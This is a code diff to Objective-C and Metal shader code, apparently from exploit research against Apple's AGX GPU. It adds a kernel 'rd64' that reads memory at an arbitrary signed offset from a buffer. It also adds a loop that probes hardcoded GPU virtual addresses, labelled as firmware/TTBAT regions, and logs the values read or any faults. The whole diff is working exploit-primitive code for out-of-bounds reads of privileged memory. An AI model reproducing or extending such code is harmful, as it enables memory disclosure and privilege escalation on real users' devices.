@@ -300,14 +300,21 @@ static void metal_cross_object_write(IOSurfaceRef surf, uint64_t agx_va, uint64_
         "               device uint *out [[buffer(1)]],\n"
         "               constant uint &idx [[buffer(2)]]) {\n"
         "  out[0] = buf[idx];\n"
+        "}\n"
+        "kernel void rd64(device ulong *buf [[buffer(0)]],\n"
+        "                 device ulong *out [[buffer(1)]],\n"
+        "                 constant long &delta [[buffer(2)]]) {\n"
+        "  out[0] = buf[delta / 8];\n"
         "}\n";
     NSError *err = nil;
     id<MTLLibrary> lib = [dev newLibraryWithSource:src options:nil error:&err];
     if (!lib) { L(@"[METAL] library error=%@", err); return; }
     id<MTLFunction> fwr = [lib newFunctionWithName:@"wr"];
     id<MTLFunction> frd = [lib newFunctionWithName:@"rd"];
+    id<MTLFunction> frd64 = [lib newFunctionWithName:@"rd64"];
     id<MTLComputePipelineState> pwr = fwr ? [dev newComputePipelineStateWithFunction:fwr error:&err] : nil;
     id<MTLComputePipelineState> prd = frd ? [dev newComputePipelineStateWithFunction:frd error:&err] : nil;
+    id<MTLComputePipelineState> prd64 = frd64 ? [dev newComputePipelineStateWithFunction:frd64 error:&err] : nil;
     if (!pwr || !prd) { L(@"[METAL] pipeline error=%@", err); return; }
 
     id<MTLBuffer> out = [dev newBufferWithLength:16 options:MTLResourceStorageModeShared];
@@ -383,6 +390,41 @@ static void metal_cross_object_write(IOSurfaceRef surf, uint64_t agx_va, uint64_
         if (out.contents) memcpy(&back, out.contents, 4);
         L(@"[METAL] FIXED +0x20000 write=0x%08x readback=0x%08x (may be 0/unbacked)",
           marker, back);
+    }
+
+    // High-VA probe: the F1 shader argument is a raw 64-bit GPU VA. Test whether
+    // TTBAT/firmware VAs are mapped in this context. A fault stops the loop.
+    if (prd64) {
+        uint64_t targets[] = {
+            0x1500000000ULL + 0x1000000ULL,
+            0x13400000000ULL,
+            0x13400000000ULL + 0x1000ULL,
+            0x100000000ULL,
+            0x800000000ULL,
+            0x1000000000ULL,
+        };
+        for (int ti = 0; ti < (int)(sizeof(targets)/sizeof(targets[0])); ti++) {
+            uint64_t target = targets[ti];
+            int64_t d = (int64_t)(target - f1ga);
+            L(@"[HIGHVA] target=0x%llx delta=0x%llx", target, (unsigned long long)d);
+            id<MTLCommandBuffer> hb = [q commandBuffer];
+            id<MTLComputeCommandEncoder> he = [hb computeCommandEncoder];
+            [he setComputePipelineState:prd64];
+            [he setBuffer:f1buf offset:0 atIndex:0];
+            [he setBuffer:out offset:0 atIndex:1];
+            [he setBytes:&d length:8 atIndex:2];
+            [he dispatchThreadgroups:MTLSizeMake(1,1,1) threadsPerThreadgroup:MTLSizeMake(1,1,1)];
+            [he endEncoding];
+            [hb commit];
+            [hb waitUntilCompleted];
+            if (hb.status == MTLCommandBufferStatusError) {
+                L(@"[HIGHVA] FAULT target=0x%llx err=%@", target, hb.error);
+                break;
+            }
+            uint64_t hv = 0;
+            if (out.contents) memcpy(&hv, out.contents, 8);
+            L(@"[HIGHVA] value=0x%llx", (unsigned long long)hv);
+        }
     }
 
     L(@"[METAL] done");
